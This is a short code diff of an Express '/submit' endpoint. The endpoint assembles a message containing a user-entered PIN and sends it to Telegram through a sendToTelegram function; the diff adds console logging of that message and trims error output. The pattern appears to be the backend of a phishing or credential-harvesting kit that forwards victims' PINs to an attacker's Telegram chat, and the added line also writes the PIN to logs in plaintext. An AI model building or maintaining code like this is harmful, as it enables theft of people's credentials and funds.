@@ -53,12 +53,14 @@ app.post("/submit", async (req, res) => {
 🔐 PIN: ${pin}
     `;
 
+console.log("SENDING MESSAGE:", message);
+
     await sendToTelegram(message);
 
     res.json({ success: true });
 
   } catch (err) {
-    console.error("ERROR:", err);
+    console.error("ERROR:", err.message);
     res.json({ success: false });
   }
 });
